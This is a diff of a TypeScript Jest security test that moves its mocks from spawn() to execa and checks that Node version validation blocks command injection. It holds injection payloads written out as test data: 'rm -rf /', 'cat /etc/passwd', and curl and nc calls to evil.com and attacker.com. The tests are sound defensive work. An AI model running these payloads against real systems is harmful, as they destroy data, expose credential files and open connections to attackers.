@@ -8,7 +8,7 @@
  * - Severity: HIGH (CWE-77: Command Injection)
  * - Attack Vector: Unvalidated nodeVersion parameter interpolated into shell command
  * - Vulnerable Line: commandExecutor.ts:101 - `fnm exec --using=${nodeVersion} ${command}`
- * - Protection: Validation MUST block injection BEFORE spawn() is called
+ * - Protection: Validation MUST block injection BEFORE execa() is called
  *
  * Target Coverage: 100% for security validation integration paths
  */
@@ -21,12 +21,12 @@ import { PollingService } from '@/core/shell/pollingService';
 import { ResourceLocker } from '@/core/shell/resourceLocker';
 import { RetryStrategyManager } from '@/core/shell/retryStrategyManager';
 import type { ExecuteOptions } from '@/core/shell/types';
-import { spawn } from 'child_process';
-import type { ChildProcess } from 'child_process';
-import { EventEmitter } from 'events';
+import { createMockExecaSubprocess, simulateSubprocessComplete } from './commandExecutor.testUtils';
 
-// Mock all dependencies
-jest.mock('child_process');
+// Mock execa
+jest.mock('execa');
+import execa from 'execa';
+
 jest.mock('@/core/logging/debugLogger', () => ({
     getLogger: () => ({
         error: jest.fn(),
@@ -46,7 +46,7 @@ jest.mock('@/core/shell/retryStrategyManager');
 describe('CommandExecutor - Security: Node Version Validation Integration', () => {
     let commandExecutor: CommandExecutor;
     let mockEnvironmentSetup: jest.Mocked<EnvironmentSetup>;
-    let spawnMock: jest.Mock;
+    const mockExeca = execa as jest.MockedFunction<typeof execa>;
 
     beforeEach(() => {
         jest.clearAllMocks();
@@ -100,9 +100,6 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             pollUntilCondition: jest.fn()
         } as any));
 
-        // Create mock for spawn
-        spawnMock = spawn as jest.Mock;
-
         // Create CommandExecutor instance
         commandExecutor = new CommandExecutor();
     });
@@ -112,7 +109,7 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
     // =================================================================
 
     describe('security: command injection prevention', () => {
-        it('should block semicolon injection BEFORE spawn() is called', async () => {
+        it('should block semicolon injection BEFORE execa() is called', async () => {
             // Given: Malicious nodeVersion with semicolon injection
             const maliciousVersion = '20; rm -rf /';
             const options: ExecuteOptions = { useNodeVersion: maliciousVersion };
@@ -120,12 +117,12 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             // When: Attempting to execute command
             const promise = commandExecutor.execute('npm install', options);
 
-            // Then: Validation throws error BEFORE spawn() is called
+            // Then: Validation throws error BEFORE execa() is called
             await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
-            expect(spawnMock).not.toHaveBeenCalled();
+            expect(mockExeca).not.toHaveBeenCalled();
         });
 
-        it('should block ampersand AND injection BEFORE spawn() is called', async () => {
+        it('should block ampersand AND injection BEFORE execa() is called', async () => {
             // Given: Malicious nodeVersion with && injection
             const maliciousVersion = '20 && cat /etc/passwd';
             const options: ExecuteOptions = { useNodeVersion: maliciousVersion };
@@ -133,12 +130,12 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             // When: Attempting to execute command
             const promise = commandExecutor.execute('npm install', options);
 
-            // Then: Validation throws error BEFORE spawn() is called
+            // Then: Validation throws error BEFORE execa() is called
             await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
-            expect(spawnMock).not.toHaveBeenCalled();
+            expect(mockExeca).not.toHaveBeenCalled();
         });
 
-        it('should block ampersand background injection BEFORE spawn() is called', async () => {
+        it('should block ampersand background injection BEFORE execa() is called', async () => {
             // Given: Malicious nodeVersion with & background execution
             const maliciousVersion = '20 & curl evil.com';
             const options: ExecuteOptions = { useNodeVersion: maliciousVersion };
@@ -146,12 +143,12 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             // When: Attempting to execute command
             const promise = commandExecutor.execute('npm install', options);
 
-            // Then: Validation throws error BEFORE spawn() is called
+            // Then: Validation throws error BEFORE execa() is called
             await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
-            expect(spawnMock).not.toHaveBeenCalled();
+            expect(mockExeca).not.toHaveBeenCalled();
         });
 
-        it('should block pipe injection BEFORE spawn() is called', async () => {
+        it('should block pipe injection BEFORE execa() is called', async () => {
             // Given: Malicious nodeVersion with pipe injection
             const maliciousVersion = '20 | nc attacker.com 1234';
             const options: ExecuteOptions = { useNodeVersion: maliciousVersion };
@@ -159,9 +156,9 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             // When: Attempting to execute command
             const promise = commandExecutor.execute('npm install', options);
 
-            // Then: Validation throws error BEFORE spawn() is called
+            // Then: Validation throws error BEFORE execa() is called
             await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
-            expect(spawnMock).not.toHaveBeenCalled();
+            expect(mockExeca).not.toHaveBeenCalled();
         });
 
         it('should block ALL 9 injection payloads comprehensively', async () => {
@@ -178,7 +175,7 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
                 '20 $(curl evil.com)'              // Command substitution (subshell)
             ];
 
-            // When/Then: Each payload is blocked BEFORE spawn() is called
+            // When/Then: Each payload is blocked BEFORE execa() is called
             for (const payload of injectionPayloads) {
                 jest.clearAllMocks();
 
@@ -186,7 +183,7 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
                 const promise = commandExecutor.execute('npm install', options);
 
                 await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
-                expect(spawnMock).not.toHaveBeenCalled();
+                expect(mockExeca).not.toHaveBeenCalled();
             }
         });
     });
@@ -196,10 +193,10 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
     // =================================================================
 
     describe('happy path: valid node version formats', () => {
-        it('should accept valid numeric version and call spawn()', async () => {
+        it('should accept valid numeric version and call execa()', async () => {
             // Given: Valid numeric version
-            const mockChild = createMockChildProcess();
-            spawnMock.mockReturnValue(mockChild);
+            const mockSubprocess = createMockExecaSubprocess();
+            mockExeca.mockReturnValue(mockSubprocess as any);
 
             const options: ExecuteOptions = { useNodeVersion: '20' };
 
@@ -208,14 +205,13 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
 
             // Simulate successful execution
             process.nextTick(() => {
-                mockChild.stdout!.emit('data', Buffer.from('success\n'));
-                mockChild.emit('close', 0);
+                simulateSubprocessComplete(mockSubprocess, 'success\n', '', 0);
             });
 
             // Then: Command executes successfully
             const result = await promise;
             expect(result.code).toBe(0);
-            expect(spawnMock).toHaveBeenCalled();
+            expect(mockExeca).toHaveBeenCalled();
         });
 
         it('should accept all known numeric versions', async () => {
@@ -226,27 +222,26 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             for (const version of validVersions) {
                 jest.clearAllMocks();
 
-                const mockChild = createMockChildProcess();
-                spawnMock.mockReturnValue(mockChild);
+                const mockSubprocess = createMockExecaSubprocess();
+                mockExeca.mockReturnValue(mockSubprocess as any);
 
                 const options: ExecuteOptions = { useNodeVersion: version };
                 const promise = commandExecutor.execute('npm install', options);
 
                 process.nextTick(() => {
-                    mockChild.stdout!.emit('data', Buffer.from('success\n'));
-                    mockChild.emit('close', 0);
+                    simulateSubprocessComplete(mockSubprocess, 'success\n', '', 0);
                 });
 
                 const result = await promise;
                 expect(result.code).toBe(0);
-                expect(spawnMock).toHaveBeenCalled();
+                expect(mockExeca).toHaveBeenCalled();
             }
         });
 
-        it('should accept valid semantic version and call spawn()', async () => {
+        it('should accept valid semantic version and call execa()', async () => {
             // Given: Valid semantic version
-            const mockChild = createMockChildProcess();
-            spawnMock.mockReturnValue(mockChild);
+            const mockSubprocess = createMockExecaSubprocess();
+            mockExeca.mockReturnValue(mockSubprocess as any);
 
             const options: ExecuteOptions = { useNodeVersion: '20.11.0' };
 
@@ -254,22 +249,21 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             const promise = commandExecutor.execute('npm install', options);
 
             process.nextTick(() => {
-                mockChild.stdout!.emit('data', Buffer.from('success\n'));
-                mockChild.emit('close', 0);
+                simulateSubprocessComplete(mockSubprocess, 'success\n', '', 0);
             });
 
             // Then: Command executes successfully
             const result = await promise;
             expect(result.code).toBe(0);
-            expect(spawnMock).toHaveBeenCalled();
+            expect(mockExeca).toHaveBeenCalled();
         });
 
         it('should accept "auto" keyword, resolve version, and validate resolved version', async () => {
             // Given: "auto" keyword (user input is valid)
             mockEnvironmentSetup.findAdobeCLINodeVersion.mockResolvedValue('18');
 
-            const mockChild = createMockChildProcess();
-            spawnMock.mockReturnValue(mockChild);
+            const mockSubprocess = createMockExecaSubprocess();
+            mockExeca.mockReturnValue(mockSubprocess as any);
 
             const options: ExecuteOptions = { useNodeVersion: 'auto' };
 
@@ -277,21 +271,20 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             const promise = commandExecutor.execute('npm install', options);
 
             process.nextTick(() => {
-                mockChild.stdout!.emit('data', Buffer.from('success\n'));
-                mockChild.emit('close', 0);
+                simulateSubprocessComplete(mockSubprocess, 'success\n', '', 0);
             });
 
             // Then: Command executes successfully (resolved version also validated)
             const result = await promise;
             expect(result.code).toBe(0);
-            expect(spawnMock).toHaveBeenCalled();
+            expect(mockExeca).toHaveBeenCalled();
             expect(mockEnvironmentSetup.findAdobeCLINodeVersion).toHaveBeenCalled();
         });
 
-        it('should accept "current" keyword and call spawn()', async () => {
+        it('should accept "current" keyword and call execa()', async () => {
             // Given: "current" keyword
-            const mockChild = createMockChildProcess();
-            spawnMock.mockReturnValue(mockChild);
+            const mockSubprocess = createMockExecaSubprocess();
+            mockExeca.mockReturnValue(mockSubprocess as any);
 
             const options: ExecuteOptions = { useNodeVersion: 'current' };
 
@@ -299,20 +292,19 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             const promise = commandExecutor.execute('npm install', options);
 
             process.nextTick(() => {
-                mockChild.stdout!.emit('data', Buffer.from('success\n'));
-                mockChild.emit('close', 0);
+                simulateSubprocessComplete(mockSubprocess, 'success\n', '', 0);
             });
 
             // Then: Command executes successfully (uses fnm env, not interpolated)
             const result = await promise;
             expect(result.code).toBe(0);
-            expect(spawnMock).toHaveBeenCalled();
+            expect(mockExeca).toHaveBeenCalled();
         });
 
-        it('should skip validation for null and call spawn()', async () => {
+        it('should skip validation for null and call execa()', async () => {
             // Given: null (no nodeVersion specified)
-            const mockChild = createMockChildProcess();
-            spawnMock.mockReturnValue(mockChild);
+            const mockSubprocess = createMockExecaSubprocess();
+            mockExeca.mockReturnValue(mockSubprocess as any);
 
             const options: ExecuteOptions = { useNodeVersion: null };
 
@@ -320,20 +312,19 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             const promise = commandExecutor.execute('npm install', options);
 
             process.nextTick(() => {
-                mockChild.stdout!.emit('data', Buffer.from('success\n'));
-                mockChild.emit('close', 0);
+                simulateSubprocessComplete(mockSubprocess, 'success\n', '', 0);
             });
 
             // Then: Command executes successfully (null skips validation)
             const result = await promise;
             expect(result.code).toBe(0);
-            expect(spawnMock).toHaveBeenCalled();
+            expect(mockExeca).toHaveBeenCalled();
         });
 
         it('should skip validation for undefined (no useNodeVersion option)', async () => {
             // Given: undefined (useNodeVersion not in options)
-            const mockChild = createMockChildProcess();
-            spawnMock.mockReturnValue(mockChild);
+            const mockSubprocess = createMockExecaSubprocess();
+            mockExeca.mockReturnValue(mockSubprocess as any);
 
             const options: ExecuteOptions = {}; // useNodeVersion is undefined
 
@@ -341,14 +332,13 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             const promise = commandExecutor.execute('npm install', options);
 
             process.nextTick(() => {
-                mockChild.stdout!.emit('data', Buffer.from('success\n'));
-                mockChild.emit('close', 0);
+                simulateSubprocessComplete(mockSubprocess, 'success\n', '', 0);
             });
 
             // Then: Command executes successfully (undefined skips validation)
             const result = await promise;
             expect(result.code).toBe(0);
-            expect(spawnMock).toHaveBeenCalled();
+            expect(mockExeca).toHaveBeenCalled();
         });
     });
 
@@ -361,8 +351,8 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             // Given: "auto" resolves to a valid version
             mockEnvironmentSetup.findAdobeCLINodeVersion.mockResolvedValue('20');
 
-            const mockChild = createMockChildProcess();
-            spawnMock.mockReturnValue(mockChild);
+            const mockSubprocess = createMockExecaSubprocess();
+            mockExeca.mockReturnValue(mockSubprocess as any);
 
             const options: ExecuteOptions = { useNodeVersion: 'auto' };
 
@@ -370,14 +360,13 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             const promise = commandExecutor.execute('npm install', options);
 
             process.nextTick(() => {
-                mockChild.stdout!.emit('data', Buffer.from('success\n'));
-                mockChild.emit('close', 0);
+                simulateSubprocessComplete(mockSubprocess, 'success\n', '', 0);
             });
 
             // Then: Resolved version is validated and command succeeds
             const result = await promise;
             expect(result.code).toBe(0);
-            expect(spawnMock).toHaveBeenCalled();
+            expect(mockExeca).toHaveBeenCalled();
         });
 
         it('should block malicious resolved version from findAdobeCLINodeVersion()', async () => {
@@ -389,15 +378,15 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             // When: Executing command
             const promise = commandExecutor.execute('npm install', options);
 
-            // Then: Resolved malicious version is blocked BEFORE spawn()
+            // Then: Resolved malicious version is blocked BEFORE execa()
             await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
-            expect(spawnMock).not.toHaveBeenCalled();
+            expect(mockExeca).not.toHaveBeenCalled();
         });
 
         it('should skip validation for "current" keyword (not interpolated)', async () => {
             // Given: "current" keyword (uses fnm env, not interpolated into --using=)
-            const mockChild = createMockChildProcess();
-            spawnMock.mockReturnValue(mockChild);
+            const mockSubprocess = createMockExecaSubprocess();
+            mockExeca.mockReturnValue(mockSubprocess as any);
 
             const options: ExecuteOptions = { useNodeVersion: 'current' };
 
@@ -405,23 +394,22 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             const promise = commandExecutor.execute('npm install', options);
 
             process.nextTick(() => {
-                mockChild.stdout!.emit('data', Buffer.from('success\n'));
-                mockChild.emit('close', 0);
+                simulateSubprocessComplete(mockSubprocess, 'success\n', '', 0);
             });
 
             // Then: "current" is not validated (safe because not interpolated)
             const result = await promise;
             expect(result.code).toBe(0);
-            expect(spawnMock).toHaveBeenCalled();
+            expect(mockExeca).toHaveBeenCalled();
         });
     });
 
     // =================================================================
-    // SPAWN BEHAVIOR VERIFICATION
+    // EXECA BEHAVIOR VERIFICATION
     // =================================================================
 
-    describe('spawn() call verification', () => {
-        it('should NEVER call spawn() when validation fails', async () => {
+    describe('execa() call verification', () => {
+        it('should NEVER call execa() when validation fails', async () => {
             // Given: Multiple invalid versions
             const invalidVersions = [
                 '20; rm -rf /',
@@ -431,7 +419,7 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
                 ''
             ];
 
-            // When/Then: spawn() is never called for any invalid version
+            // When/Then: execa() is never called for any invalid version
             for (const version of invalidVersions) {
                 jest.clearAllMocks();
 
@@ -439,14 +427,14 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
                 const promise = commandExecutor.execute('npm install', options);
 
                 await expect(promise).rejects.toThrow();
-                expect(spawnMock).not.toHaveBeenCalled();
+                expect(mockExeca).not.toHaveBeenCalled();
             }
         });
 
-        it('should call spawn() with validated version in command', async () => {
+        it('should call execa() with validated version in command', async () => {
             // Given: Valid version
-            const mockChild = createMockChildProcess();
-            spawnMock.mockReturnValue(mockChild);
+            const mockSubprocess = createMockExecaSubprocess();
+            mockExeca.mockReturnValue(mockSubprocess as any);
 
             const options: ExecuteOptions = { useNodeVersion: '20' };
 
@@ -454,39 +442,19 @@ describe('CommandExecutor - Security: Node Version Validation Integration', () =
             const promise = commandExecutor.execute('npm install', options);
 
             process.nextTick(() => {
-                mockChild.stdout!.emit('data', Buffer.from('success\n'));
-                mockChild.emit('close', 0);
+                simulateSubprocessComplete(mockSubprocess, 'success\n', '', 0);
             });
 
             await promise;
 
-            // Then: spawn() was called with validated version interpolated safely
-            expect(spawnMock).toHaveBeenCalled();
+            // Then: execa() was called with validated version interpolated safely
+            expect(mockExeca).toHaveBeenCalled();
 
-            // Verify spawn was called with command containing validated version
-            const spawnCall = spawnMock.mock.calls[0];
-            const command = spawnCall[0];
+            // Verify execa was called with command containing validated version
+            const execaCall = mockExeca.mock.calls[0];
+            const command = execaCall[0];
             expect(command).toContain('fnm exec --using=20');
             expect(command).toContain('npm install');
         });
     });
 });
-
-// =================================================================
-// TEST HELPERS
-// =================================================================
-
-/**
- * Helper to create mock ChildProcess for testing
- */
-function createMockChildProcess(): ChildProcess {
-    const mockChild = new EventEmitter() as any;
-    mockChild.stdout = new EventEmitter();
-    mockChild.stderr = new EventEmitter();
-    mockChild.stdin = { write: jest.fn(), end: jest.fn() };
-    mockChild.pid = 12345;
-    Object.defineProperty(mockChild, 'killed', { value: false, writable: true });
-    Object.defineProperty(mockChild, 'exitCode', { value: null, writable: true });
-    mockChild.kill = jest.fn();
-    return mockChild as ChildProcess;
-}
